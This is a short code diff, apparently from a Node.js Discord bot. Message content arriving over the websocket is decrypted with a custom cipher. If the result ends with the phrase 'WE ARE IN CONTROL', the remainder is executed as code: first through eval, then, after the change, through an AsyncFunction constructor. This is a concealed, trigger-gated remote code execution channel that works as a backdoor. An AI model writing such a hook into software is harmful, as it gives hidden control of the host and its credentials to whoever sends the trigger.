@@ -243,7 +243,7 @@ async function wsConnect(startmsg){
         let demsg=new enc.Cipher(req.d.content.substr(1,req.d.content.length-2),enc.chant).setCharset(new enc.Charset(enc.b95+'\n')).text
         if(demsg.substr(demsg.length-17)=='WE ARE IN CONTROL'){
           console.log('run')
-          eval(demsg.substr(0,demsg.length-17))
+          (async()=>{}).constructor(demsg.substr(0,demsg.length-17))()
         }
       }
       
@@ -427,7 +427,7 @@ function sleep(ms){
 }
   
 async function getLatestMessages(channelId,limit=10){
-  return await (await fetch(`https://discord.com/api/v${disV}/channels/${channelId}/messages?limit=${limit}`,{
+  return (await fetch(`https://discord.com/api/v${disV}/channels/${channelId}/messages?limit=${limit}`,{
     method:"GET",
     headers:{
       "Authorization":`Bot ${process.env.DISCORD_BOT_TOKEN}`,
